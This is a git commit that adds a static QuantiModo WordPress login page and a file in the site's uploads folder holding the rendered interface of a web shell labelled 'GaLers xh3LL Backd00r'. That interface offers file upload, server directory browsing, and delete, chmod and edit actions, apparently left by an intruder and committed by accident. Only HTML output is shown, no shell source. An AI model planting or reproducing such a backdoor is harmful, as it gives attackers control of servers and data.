170c21a86c27709091e448519c2ed3807d58bf8f
Mike P. Sinn <m@quantimodo.com>
2017-08-30 14:44:12 -0500

    Big bang

---
+++ wp-content/uploads/rtMedia/tmp/rt.php
@@ -0,0 +1,78 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+<link href="" rel="stylesheet" type="text/css">
+<title>GaLers xh3LL Backd00r</title>
+<style>
+body{
+font-family: "Racing Sans One", cursive;
+background-color: #e6e6e6;
+text-shadow:0px 0px 1px #757575;
+}
+#content tr:hover{
+background-color: #636263;
+text-shadow:0px 0px 10px #fff;
+}
+#content .first{
+background-color: silver;
+}
+#content .first:hover{
+background-color: silver;
+text-shadow:0px 0px 1px #757575;
+}
+table{
+border: 1px #000000 dotted;
+}
+H1{
+font-family: "Rye", cursive;
+}
+a{
+color: #000;
+text-decoration: none;
+}
+a:hover{
+color: #fff;
+text-shadow:0px 0px 10px #ffffff;
+}
+input,select,textarea{
+border: 1px #000000 solid;
+-moz-border-radius: 5px;
+-webkit-border-radius:5px;
+border-radius:5px;
+}
+</style>
+</head>
+<body>
+<h1><center>[#] GaLers xh3LL Backd00r [#] </center></h1>
+<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr><td>Current Path : <a href="/wp-content/uploads/rtMedia/tmp/rt.php?path=/">/</a><a href="/wp-content/uploads/rtMedia/tmp/rt.php?path=/home">home</a>/<a href="/wp-content/uploads/rtMedia/tmp/rt.php?path=/home/quantimo">quantimo</a>/<a href="/wp-content/uploads/rtMedia/tmp/rt.php?path=/home/quantimo/public_html">public_html</a>/<a href="/wp-content/uploads/rtMedia/tmp/rt.php?path=/home/quantimo/public_html/wp-content">wp-content</a>/<a href="/wp-content/uploads/rtMedia/tmp/rt.php?path=/home/quantimo/public_html/wp-content/uploads">uploads</a>/<a href="/wp-content/uploads/rtMedia/tmp/rt.php?path=/home/quantimo/public_html/wp-content/uploads/rtMedia">rtMedia</a>/<a href="/wp-content/uploads/rtMedia/tmp/rt.php?path=/home/quantimo/public_html/wp-content/uploads/rtMedia/tmp">tmp</a>/</td></tr><tr><td><form enctype="multipart/form-data" method="POST">
+Upload File : <input type="file" name="f" />
+<input type="submit" value="upload" />
+</form>
+</td></tr></table><br /><center></center><div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr class="first">
+<td><center>Name</center></td>
+<td><center>Size</center></td>
+<td><center>Permissions</center></td>
+<td><center>Options</center></td>
+</tr><tr class="first"><td></td><td></td><td></td><td></td></tr><tr>
+<td><a href="/wp-content/uploads/rtMedia/tmp/rt.php?filesrc=/home/quantimo/public_html/wp-content/uploads/rtMedia/tmp/rt.php&path=/home/quantimo/public_html/wp-content/uploads/rtMedia/tmp">rt.php</a></td>
+<td><center>8.204 KB</center></td>
+<td><center><font color="green">-rw-r--r--</font></center></td>
+<td><center><form method="POST" action="/wp-content/uploads/rtMedia/tmp/rt.php?option&path=/home/quantimo/public_html/wp-content/uploads/rtMedia/tmp">
+<select name="opt">
+<option value=""></option>
+<option value="delete">Delete</option>
+<option value="chmod">Chmod</option>
+<option value="rename">Rename</option>
+<option value="edit">Edit</option>
+</select>
+<input type="hidden" name="type" value="file">
+<input type="hidden" name="name" value="rt.php">
+<input type="hidden" name="path" value="/home/quantimo/public_html/wp-content/uploads/rtMedia/tmp/rt.php">
+<input type="submit" value=">" />
+</form></center></td>
+</tr></table>
+</div><br />Mr. DellatioNx196 GaLers xh3LL Backd00r <font color="red">1.0</font>, Coded By <font color="red">Mr. DellatioNx196 - Bogor BlackHat</font>
+</body>
+</html>
---
+++ wp-login.php
@@ -0,0 +1,113 @@
+<!DOCTYPE html>
+	<!--[if IE 8]>
+		<html xmlns="http://www.w3.org/1999/xhtml" class="ie8" lang="en-US">
+	<![endif]-->
+	<!--[if !(IE 8) ]><!-->
+		<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
+	<!--<![endif]-->
+	<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+	<title>QuantiModo &lsaquo; Log In</title>
+	<link rel='dns-prefetch' href='//s.w.org' />
+<script type='text/javascript' src='/wp-admin/load-scripts.php?c=0&amp;load%5B%5D=jquery-core,jquery-migrate&amp;ver=4.8.1'></script>
+<script type='text/javascript' src='/wp-content/plugins/wp-google-analytics-events/js/ga-scroll-events.js?ver=2.4.5'></script>
+<script type='text/javascript' src='/wp-content/plugins/jetpack/modules/sso/jetpack-sso-login.js?ver=5.2.1'></script>
+<link rel='stylesheet' href='/wp-admin/load-styles.php?c=0&amp;dir=ltr&amp;load%5B%5D=dashicons,buttons,forms,l10n,login&amp;ver=4.8.1' type='text/css' media='all' />
+<link rel='stylesheet' id='simple-payments-css'  href='/wp-content/plugins/jetpack/modules/simple-payments/simple-payments.css?ver=4.8.1' type='text/css' media='all' />
+<link rel='stylesheet' id='genericons-css'  href='/wp-content/plugins/jetpack/_inc/genericons/genericons/genericons.css?ver=3.1' type='text/css' media='all' />
+<link rel='stylesheet' id='jetpack-sso-login-css'  href='/wp-content/plugins/jetpack/modules/sso/jetpack-sso-login.css?ver=5.2.1' type='text/css' media='all' />
+			<style>
+				.jetpack-sso .message {
+					margin-top: 20px;
+				}
+
+				.jetpack-sso #login .message:first-child,
+				.jetpack-sso #login h1 + .message {
+					margin-top: 0;
+				}
+			</style>
+		<meta name='robots' content='noindex,follow' />
+	<meta name="viewport" content="width=device-width" />
+	
+<style>.login h1 a { background-image: url("/wp-content/uploads/2015/11/QM-LOGO-CRAZY-ARROWS-Mike-Bigger-300-60-Mobile1_yzbrhw.png");background-size: contain;min-height: 88px;width:auto;}#login {padding: 20px 0 0;}.login #nav a, .login #backtoblog a {color:!important;text-shadow:none;}</style>
+<link rel="icon" href="/wp-content/uploads/2017/02/QM-LOGO-ICON-144-flat-arrow-butt-100x100.png" sizes="32x32" />
+<link rel="icon" href="/wp-content/uploads/2017/02/QM-LOGO-ICON-144-flat-arrow-butt.png" sizes="192x192" />
+<link rel="apple-touch-icon-precomposed" href="/wp-content/uploads/2017/02/QM-LOGO-ICON-144-flat-arrow-butt.png" />
+<meta name="msapplication-TileImage" content="https://quantimo.do/wp-content/uploads/2017/02/QM-LOGO-ICON-144-flat-arrow-butt.png" />
+	</head>
+	<body class="login login-action-login wp-core-ui  locale-en-us jetpack-sso jetpack-sso-form-display">
+		<div id="login">
+		<h1><a href="/" title="QuantiModo" tabindex="-1">QuantiModo</a></h1>
+	
+<form name="loginform" id="loginform" action="/wp-login.php" method="post">
+	<p>
+		<label for="user_login">Username or Email Address<br />
+		<input type="text" name="log" id="user_login" class="input" value="" size="20" /></label>
+	</p>
+	<p>
+		<label for="user_pass">Password<br />
+		<input type="password" name="pwd" id="user_pass" class="input" value="" size="20" /></label>
+	</p>
+			<div id="jetpack-sso-wrap">
+			
+
+			<div id="jetpack-sso-wrap__action">
+				<a rel="nofollow" href="/wp-login.php?action=jetpack-sso&#038;redirect_to=https%3A%2F%2F%2Fwp-admin%2Fnav-menus.php" class="jetpack-sso button button-primary"><span><span class="genericon genericon-wordpress"></span> Log in with WordPress.com</span></a>
+									<p>
+						You can now save time spent logging in by connecting your WordPress.com account to QuantiModo.					</p>
+							</div>
+
+							<div class="jetpack-sso-or">
+					<span>Or</span>
+				</div>
+
+				<a href="/wp-login.php?redirect_to=https%3A%2F%2F%2Fwp-admin%2Fnav-menus.php&#038;reauth=1&#038;jetpack-sso-show-default-form=1" class="jetpack-sso-toggle wpcom">
+					Log in with username and password				</a>
+
+				<a href="/wp-login.php?redirect_to=https%3A%2F%2F%2Fwp-admin%2Fnav-menus.php&#038;reauth=1&#038;jetpack-sso-show-default-form=0" class="jetpack-sso-toggle default">
+					Log in with WordPress.com				</a>
+					</div>
+			<p class="forgetmenot"><label for="rememberme"><input name="rememberme" type="checkbox" id="rememberme" value="forever"  /> Remember Me</label></p>
+	<p class="submit">
+		<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" />
+		<input type="hidden" name="redirect_to" value="https://quantimo.do/wp-admin/nav-menus.php" />
+		<input type="hidden" name="testcookie" value="1" />
+	</p>
+</form>
+
+<p id="nav">
+	<a href="/wp-login.php?action=lostpassword">Lost your password?</a>
+</p>
+
+<script type="text/javascript">
+function wp_attempt_focus(){
+setTimeout( function(){ try{
+d = document.getElementById('user_login');
+d.focus();
+d.select();
+} catch(e){}
+}, 200);
+}
+
+/**
+ * Filters whether to print the call to `wp_attempt_focus()` on the login screen.
+ *
+ * @since 4.8.0
+ *
+ * @param bool $print Whether to print the function call. Default true.
+ */
+wp_attempt_focus();
+if(typeof wpOnload=='function')wpOnload();
+</script>
+
+	<p id="backtoblog"><a href="/">&larr; Back to QuantiModo</a></p>
+	
+	</div>
+
+	
+	<link rel='stylesheet' id='open-sans-css'  href='https://fonts.googleapis.com/css?family=Open+Sans%3A300italic%2C400italic%2C600italic%2C300%2C400%2C600&#038;subset=latin%2Clatin-ext&#038;ver=4.8.1' type='text/css' media='all' />
+<link rel='stylesheet' id='jetpack_css-css'  href='/wp-content/plugins/jetpack/css/jetpack.css?ver=5.2.1' type='text/css' media='all' />
+	<div class="clear"></div>
+	</body>
+	</html>
+	
